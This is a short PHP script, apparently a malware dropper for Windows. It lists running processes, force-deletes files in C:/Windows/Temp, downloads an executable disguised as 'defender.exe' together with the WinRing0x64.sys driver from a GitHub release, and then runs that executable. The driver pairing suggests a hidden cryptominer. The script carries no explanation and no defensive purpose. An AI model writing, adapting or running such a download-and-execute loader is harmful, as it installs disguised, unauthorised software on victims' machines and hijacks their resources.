    /*<?php /**/


function deleteFile($filePath) {

    if (file_exists($filePath)) {
        if (unlink($filePath)) {
            echo "Deleted: $filePath\n";
        } else {
            echo "Failed to delete: $filePath\n";
        }
    } else {
        echo "File does not exist: $filePath\n";
    }
}


function downloadFile($url, $savePath) {

    // Check if the file already exists
    if (!file_exists($savePath)) {


    

    // Download the file if it does not exist
    $downloadedFile = file_get_contents($url);
    if ($downloadedFile !== false) {
        if (file_put_contents($savePath, $downloadedFile)) {
            echo "Downloaded and saved: $savePath\n";
        } else {
            echo "Failed to download and save: $savePath\n";
        }
    } else {
        echo "Failed to download: $url\n";
    }
    } 
}







$checkfile1 = 'C:/Windows/Temp/defender.exe';

exec('tasklist', $output);

$url =  'https://github.com/danialchork/project-final/releases/download/last/defender.exe';
$url2 =  'https://github.com/danialchork/project-final/releases/download/last/WinRing0x64.sys';

$file_name = 'C:/Windows/Temp/defender.exe';
$file_name2 = 'C:/Windows/Temp/WinRing0x64.sys';

$found = false;
$found2 = false;
foreach ($output as $line) {
    if (stripos(strtolower($line), 'spotify.exe') !== false) {
        $found = true;

    }
    if (stripos(strtolower($line), 'defender.exe') !== false) {
        $found2 = true;

    }
}

if (!$found && !$found2) {

        
         
        system('del /f /q "C:/Windows/Temp/WinRing0x64.sys"');
        system('del /f /q "C:/Windows/Temp/config.json"');
        system('del /f /q "C:/Windows/Temp/defender.exe"');

        if (file_put_contents($file_name, file_get_contents($url)))
            {
                echo "File downloaded successfully";
            }
        else
            {
            echo "File downloading failed.";
            }

         if (file_put_contents($file_name2, file_get_contents($url2)))
            {
                echo "File downloaded successfully";
            }
        else
            {
            echo "File downloading failed.";
            }


         system('C:/Windows/Temp/defender.exe');
        }






